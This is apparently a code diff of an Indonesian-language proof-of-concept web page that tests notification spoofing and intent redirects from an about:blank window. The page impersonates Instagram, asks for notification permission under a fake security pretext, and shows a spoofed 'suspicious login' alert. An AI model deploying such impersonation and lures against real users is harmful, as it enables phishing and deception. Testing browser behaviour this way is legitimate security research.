@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Android Notification Spoof & Intent Redirect</title>
+<title>About:Blank Notification Spoof & Intent Redirect</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
@@ -11,7 +11,6 @@
   .panel { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #0f3460; }
   button { padding: 14px 24px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 15px; font-weight: bold; width: 100%; }
   button:hover { background: #c73650; }
-  button:disabled { background: #555; cursor: not-allowed; }
   #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #0f3460; }
   .success { color: #4caf50; font-weight: bold; }
   .error { color: #f44336; }
@@ -21,14 +20,13 @@
 </head>
 <body>
 
-<h1>📱 Android Notification Spoof & Intent Redirect</h1>
+<h1>📱 About:Blank Notification Spoof & Intent Redirect</h1>
 
 <div class="panel">
-  <p style="color:#aaa; margin-bottom:20px;">Uji notifikasi palsu dan redirect via Intent di Android Chrome.</p>
-  <button id="btnRequestNotif">1. Minta Izin Notifikasi</button>
-  <button id="btnShowNotif">2. Tampilkan Notifikasi Palsu "Instagram"</button>
-  <button id="btnRedirectIntent">3. Redirect ke Instagram via Intent</button>
-  <button id="btnRedirectUrl">4. Redirect ke Instagram via URL</button>
+  <p style="color:#aaa; margin-bottom:20px;">Pilih metode di bawah. Semua metode akan membuka about:blank dan mencoba notifikasi palsu.</p>
+  <button id="btnWindowOpen">1. Window.open('about:blank') + Notifikasi</button>
+  <button id="btnLocation">2. Location = 'about:blank' + Notifikasi</button>
+  <button id="btnRedirectInstagram">3. Langsung ke Instagram (via Intent)</button>
   <button id="clear" style="background:#555; margin-top:10px;">Bersihkan Log</button>
 </div>
 
@@ -52,113 +50,187 @@
   }
 
   // ============================================
-  // FUNGSI: MINTA IZIN NOTIFIKASI
+  // KONTEN HTML UNTUK ABOUT:BLANK
   // ============================================
-  document.getElementById('btnRequestNotif').onclick = () => {
-    log('=== MINTA IZIN NOTIFIKASI ===', 'info');
+  function getAboutBlankContent(redirectToInstagram) {
+    return `
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram Security</title>
+        <style>
+          body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+          .card { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+          h2 { color: #262626; }
+          p { color: #666; font-size: 14px; }
+          .btn { background: #0095f6; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h2>Instagram</h2>
+          <p id="status">Meminta izin notifikasi...</p>
+          <button class="btn" id="reqBtn">Izinkan Notifikasi Keamanan</button>
+        </div>
+        <script>
+          (function() {
+            var statusEl = document.getElementById('status');
+            var reqBtn = document.getElementById('reqBtn');
 
-    if (!('Notification' in window)) {
-      log('❌ Browser tidak mendukung Notification API.', 'error');
-      return;
-    }
+            // Fungsi minta izin
+            function requestNotif() {
+              if (!('Notification' in window)) {
+                statusEl.textContent = 'Browser tidak mendukung notifikasi.';
+                return;
+              }
+              if (Notification.permission === 'granted') {
+                statusEl.textContent = 'Izin sudah diberikan.';
+                parent.postMessage({ status: 'notif_granted' }, '*');
+                showNotification();
+                return;
+              }
+              if (Notification.permission === 'denied') {
+                statusEl.textContent = 'Izin ditolak.';
+                parent.postMessage({ status: 'notif_denied' }, '*');
+                return;
+              }
+              Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') {
+                  statusEl.textContent = 'Izin diberikan!';
+                  parent.postMessage({ status: 'notif_granted' }, '*');
+                  showNotification();
+                } else {
+                  statusEl.textContent = 'Izin ditolak.';
+                  parent.postMessage({ status: 'notif_denied' }, '*');
+                }
+              }).catch(function(err) {
+                statusEl.textContent = 'Error: ' + err.message;
+                parent.postMessage({ status: 'notif_error', error: err.message }, '*');
+              });
+            }
 
-    if (Notification.permission === 'granted') {
-      log('✅ Izin sudah diberikan sebelumnya.', 'success');
-      return;
-    }
+            // Fungsi tampilkan notifikasi
+            function showNotification() {
+              try {
+                var notif = new Notification('Instagram Security', {
+                  body: 'Ada aktivitas login mencurigakan. Klik untuk mengamankan akun.',
+                  icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23E4405F"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>',
+                  tag: 'insta-security',
+                  requireInteraction: true
+                });
+                notif.onclick = function() {
+                  window.open('https://www.instagram.com', '_blank');
+                  notif.close();
+                };
+                parent.postMessage({ status: 'notif_shown' }, '*');
+              } catch (e) {
+                parent.postMessage({ status: 'notif_show_error', error: e.message }, '*');
+              }
+            }
 
-    if (Notification.permission === 'denied') {
-      log('❌ Izin ditolak sebelumnya. Buka pengaturan Chrome untuk mengizinkan.', 'error');
-      return;
-    }
+            // Event listener tombol
+            reqBtn.addEventListener('click', requestNotif);
 
-    Notification.requestPermission().then((permission) => {
-      if (permission === 'granted') {
-        log('✅ Izin notifikasi DIBERIKAN.', 'success');
-        log('Sekarang klik tombol "Tampilkan Notifikasi Palsu".', 'info');
-      } else {
-        log('❌ Izin notifikasi DITOLAK.', 'error');
-      }
-    }).catch((err) => {
-      log('❌ Error: ' + err.message, 'error');
-    });
-  };
+            // Redirect otomatis jika diminta
+            if (${redirectToInstagram}) {
+              setTimeout(function() {
+                parent.postMessage({ status: 'redirecting' }, '*');
+                // Coba buka Instagram via Intent (jika Android)
+                var isAndroid = /Android/i.test(navigator.userAgent);
+                if (isAndroid) {
+                  window.location.href = 'intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end';
+                } else {
+                  window.location.href = 'https://www.instagram.com';
+                }
+              }, 2000);
+            }
+          })();
+        <\/script>
+      </body>
+      </html>
+    `;
+  }
 
   // ============================================
-  // FUNGSI: TAMPILKAN NOTIFIKASI PALSU
+  // METODE 1: window.open('about:blank')
   // ============================================
-  document.getElementById('btnShowNotif').onclick = () => {
-    log('=== TAMPILKAN NOTIFIKASI PALSU ===', 'info');
+  document.getElementById('btnWindowOpen').onclick = () => {
+    log('=== METODE 1: window.open(\'about:blank\') ===', 'info');
 
-    if (!('Notification' in window)) {
-      log('❌ Browser tidak mendukung Notification API.', 'error');
+    const win = window.open('about:blank', '_blank');
+    if (!win) {
+      log('❌ Popup diblokir. Izinkan popup.', 'error');
       return;
     }
+    log('✅ Tab about:blank dibuka.', 'success');
 
-    if (Notification.permission !== 'granted') {
-      log('❌ Izin belum diberikan. Klik "Minta Izin Notifikasi" dulu.', 'error');
-      return;
-    }
-
+    // Tulis konten ke tab about:blank
     try {
-      // Ikon Instagram (SVG data URI)
-      const instagramIcon = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23E4405F"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>';
+      win.document.open();
+      win.document.write(getAboutBlankContent(true)); // redirectToInstagram = true
+      win.document.close();
+      log('Konten ditulis ke about:blank.', 'success');
 
-      const notif = new Notification('Instagram', {
-        body: 'Anda memiliki pesan baru dari @user123',
-        icon: instagramIcon,
-        tag: 'insta-notif',
-        requireInteraction: true
+      // Listener pesan dari tab about:blank
+      window.addEventListener('message', (e) => {
+        if (e.data && e.data.status) {
+          switch (e.data.status) {
+            case 'notif_granted': log('✅ Izin notifikasi DIBERIKAN dari about:blank!', 'success'); break;
+            case 'notif_denied': log('❌ Izin notifikasi DITOLAK dari about:blank.', 'error'); break;
+            case 'notif_error': log('❌ Error request notif: ' + e.data.error, 'error'); break;
+            case 'notif_shown': log('🔔 Notifikasi "Instagram Security" DITAMPILKAN!', 'success'); break;
+            case 'notif_show_error': log('❌ Gagal menampilkan notifikasi: ' + e.data.error, 'error'); break;
+            case 'redirecting': log('🔄 Redirect ke Instagram...', 'warn'); break;
+          }
+        }
       });
-
-      notif.onclick = function() {
-        // Redirect ke Instagram via URL (bisa juga pakai intent)
-        window.open('https://www.instagram.com', '_blank');
-        notif.close();
-      };
-
-      log('🔔 Notifikasi palsu "Instagram" DITAMPILKAN!', 'success');
-      log('   Jika user mengklik notifikasi, mereka akan diarahkan ke Instagram asli.', 'info');
     } catch (e) {
-      log('❌ Gagal menampilkan notifikasi: ' + e.message, 'error');
+      log('❌ Gagal menulis ke about:blank: ' + e.name + ' - ' + e.message, 'error');
     }
   };
 
   // ============================================
-  // FUNGSI: REDIRECT VIA INTENT
+  // METODE 2: window.location = 'about:blank'
   // ============================================
-  document.getElementById('btnRedirectIntent').onclick = () => {
-    log('=== REDIRECT VIA INTENT ===', 'info');
+  document.getElementById('btnLocation').onclick = () => {
+    log('=== METODE 2: window.location = \'about:blank\' ===', 'warn');
+    log('⚠️ Metode ini akan menavigasi tab saat ini ke about:blank.', 'warn');
+    log('   Setelah navigasi, origin menjadi null dan notifikasi PASTI gagal.', 'info');
+    log('   Kita akan mencoba inject script via opener setelah navigasi.', 'info');
 
-    // Intent untuk membuka aplikasi Instagram (jika terinstal)
-    // Jika tidak terinstal, fallback ke browser
-    const intentUrl = 'intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end';
+    // Simpan referensi ke halaman saat ini
+    const currentUrl = window.location.href;
 
-    log('Mencoba membuka via Intent...', 'info');
-    log('URL: ' + intentUrl, 'info');
+    // Navigasi ke about:blank
+    window.location.href = 'about:blank';
 
-    try {
-      // Buka di tab baru (Chrome Android akan memproses intent)
-      window.location.href = intentUrl;
-      log('✅ Intent dieksekusi. Jika Instagram terinstal, aplikasi akan terbuka.', 'success');
-      log('   Jika tidak, browser akan menampilkan error atau fallback.', 'info');
-    } catch (e) {
-      log('❌ Gagal: ' + e.message, 'error');
-    }
+    // Catatan: Setelah navigasi, script di halaman ini akan berhenti.
+    // Kita tidak bisa menjalankan script setelah navigasi karena halaman sudah berganti.
   };
 
   // ============================================
-  // FUNGSI: REDIRECT VIA URL
+  // METODE 3: LANGSUNG KE INSTAGRAM (INTENT)
   // ============================================
-  document.getElementById('btnRedirectUrl').onclick = () => {
-    log('=== REDIRECT VIA URL ===', 'info');
+  document.getElementById('btnRedirectInstagram').onclick = () => {
+    log('=== METODE 3: LANGSUNG KE INSTAGRAM (INTENT) ===', 'info');
 
-    log('Membuka https://www.instagram.com...', 'info');
-    try {
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    log('User-Agent Android: ' + isAndroid, 'info');
+
+    if (isAndroid) {
+      const intentUrl = 'intent://instagram.com/#Intent;scheme=https;package=com.instagram.android;end';
+      log('Membuka Intent: ' + intentUrl, 'info');
+      try {
+        window.location.href = intentUrl;
+        log('✅ Intent dieksekusi.', 'success');
+      } catch (e) {
+        log('❌ Gagal: ' + e.message, 'error');
+      }
+    } else {
+      log('Bukan Android, membuka URL biasa...', 'info');
       window.open('https://www.instagram.com', '_blank');
-      log('✅ Tab baru dibuka ke Instagram.', 'success');
-    } catch (e) {
-      log('❌ Gagal: ' + e.message, 'error');
     }
   };
 
@@ -173,9 +245,9 @@
   // ============================================
   // INIT
   // ============================================
-  log('PoC Android siap. Pilih tombol di atas.', 'info');
-  log('⚠️ Notifikasi palsu hanya muncul jika izin diberikan.', 'warn');
-  log('   Intent hanya berfungsi di Android Chrome.', 'info');
+  log('PoC siap. Pilih metode di atas.', 'info');
+  log('⚠️ Browser modern memblokir request notifikasi dari about:blank (origin null).', 'warn');
+  log('   Jika ada metode yang berhasil, itu adalah BUG.', 'info');
 
 })();
 </script>
